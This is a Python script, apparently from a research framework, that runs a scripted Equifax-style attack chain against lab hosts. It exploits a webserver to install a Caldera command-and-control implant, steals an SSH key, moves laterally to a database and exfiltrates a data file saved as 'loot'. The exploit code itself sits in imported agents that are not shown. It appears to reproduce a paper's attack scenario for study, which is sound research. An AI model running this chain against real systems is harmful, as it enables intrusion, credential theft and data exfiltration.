import datetime
import pathlib
from dotenv import load_dotenv
load_dotenv()

from incalmo.core.models import Host
from incalmo.core.services import EnvironmentStateService, CncService
from incalmo.core.agents.find_info_agent import FindInfoAgent
from incalmo.core.agents.lateral_move_agent import LateralMoveAgent
from incalmo.core.agents.exfiltrate_agent import ExfiltrateAgent

WEBSERVER = "192.168.201.2"
DATABASE = "192.168.201.100"
LOOT_PATH = "/home/database/data.json"


def run_equifax_baseline():
    """
    Deterministic Equifax kill chain using the scaffold agents + the Caldera C&C.

    Lateral moves install a persistent implant; every later command runs through
    Caldera (CncRunner), not by re-exploiting -- faithful to the paper.
    Requires Caldera running and CALDERA_API_KEY set (red API token from its logs).
    """
    env = EnvironmentStateService(attacker_ip="192.168.201.50")
    cnc = CncService()  # reads CALDERA_API_KEY from the environment
    # Normally ScanAgent discovers these; we seed them for the baseline.
    env.add_host(Host(ip=WEBSERVER))
    env.add_host(Host(ip=DATABASE))

    lateral = LateralMoveAgent(env, cnc)
    findinfo = FindInfoAgent(env)
    exfiltrate = ExfiltrateAgent(env)

    print("[*] Equifax baseline (scaffold agents + Caldera C&C) starting")

    # Step 1: initial access to the webserver (Struts exploit -> install implant)
    web = lateral.run(WEBSERVER)["data"]["runner"]
    print(f"[+] Step 1  C&C implant on webserver {WEBSERVER}")

    # Step 2: find SSH credentials on the webserver (via C&C)
    findinfo.run(web, found_on_host=WEBSERVER)
    cred = env.get_credentials()[0]
    print(f"[+] Step 2  stole key for {cred.username} -> {cred.can_access_hosts}")

    # Step 3: lateral move to the database with the stolen key (-> install implant)
    db = lateral.run(DATABASE, credential=cred)["data"]["runner"]
    print(f"[+] Step 3  C&C implant on database {DATABASE}")

    # Step 4: exfiltrate the data (via C&C)
    result = exfiltrate.run(db, LOOT_PATH)
    print(f"[+] Step 4  {result['message']}")

    # Save the loot
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out_dir = pathlib.Path(__file__).resolve().parents[3] / "output" / stamp
    out_dir.mkdir(parents=True, exist_ok=True)
    saved_path = result["data"]["saved_to"]
    import shutil
    shutil.copy(saved_path, out_dir / "data.json")

    print(f"[*] compromised = {[h.ip for h in env.get_compromised_hosts()]}")
    print(f"[*] loot saved to {out_dir / 'data.json'}")


if __name__ == "__main__":
    run_equifax_baseline()
